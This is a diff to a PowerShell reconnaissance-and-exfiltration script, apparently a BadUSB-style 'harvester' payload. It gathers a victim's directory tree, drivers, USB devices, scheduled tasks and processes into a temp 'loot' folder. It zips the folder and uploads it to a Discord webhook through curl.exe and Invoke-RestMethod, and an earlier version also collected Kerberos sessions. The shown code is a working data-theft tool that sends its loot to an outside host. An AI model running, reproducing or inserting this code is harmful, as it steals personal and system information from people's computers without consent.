@@ -31,26 +31,21 @@
 ######################################################################################################################################################################
 
 # Create loot folder, file, and zip
-
+<#
 $FolderName = "$env:USERNAME-$(get-date -f 'M/d/yyyy h:mmtt')_harvester"
 
 $FileName = "$FolderName.txt"
 
 $ZipFile = "$FolderName.zip"
+#>
 
-New-Item -Path $env:tmp/$FolderName -ItemType Directory
-
-######################################################################################################################################################################
-
-#Discord access token (not needed in ps1?)
-
-#$dc = ""
+New-Item "$env:tmp/$env:USERNAME-Harvester" -ItemType Directory -Force
 
 ######################################################################################################################################################################
 
 # Recon all user directories (/a=parsing? /f=full directory?)
 
-tree $env:USERPROFILE /a /f >> $env:TEMP\$FolderName\FileTree.txt
+tree $env:USERPROFILE /a /f >> $env:tmp\$env:USERNAME-Harvester\FileTree.txt
 
 ######################################################################################################################################################################
 
@@ -273,8 +268,10 @@ $Drivers = Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $
 #Referenced I-Am-Jakoby
 $COMDev = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
 
-#Kerberos tickets = klist session?
+#Kerberos tickets = klist session? Not working..
+<#
 $klist = klist sessions
+#>
 
 #Lists scheduled tasks
 $ScheduledTasks = Get-ScheduledTask
@@ -425,21 +422,16 @@ $ScheduledTasks
 
 ------------------------------------------------------------------------------------------------------------------------------
 
-Logon Sessions:
-$klist
-
-------------------------------------------------------------------------------------------------------------------------------
-
 Running Processes:
 $RunningProc
 
 "@
 
-$output > $env:TEMP\$FolderName/Harvested.txt
+$output > $env:tmp\$env:USERNAME-Harvester\ComputerInfo.txt
 
 ######################################################################################################################################################################
 
-Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZipFile
+Compress-Archive -Path $env:tmp/$env:USERNAME-Harvester -DestinationPath $env:tmp/$env:USERNAME-Harvester.zip
 
 ######################################################################################################################################################################
 
@@ -454,10 +446,11 @@ param (
     [string]$text 
 )
 
-$hookurl = "$dc"
+#Webhook created in discord channel
+$hookurl = '$dc'
+
 
 $Body = @{
-  'username' = $env:username
   'content' = $text
 }
 
@@ -467,7 +460,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZipFile"}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$env:USERNAME-Harvester.zip"}
 
 ######################################################################################################################################################################
 
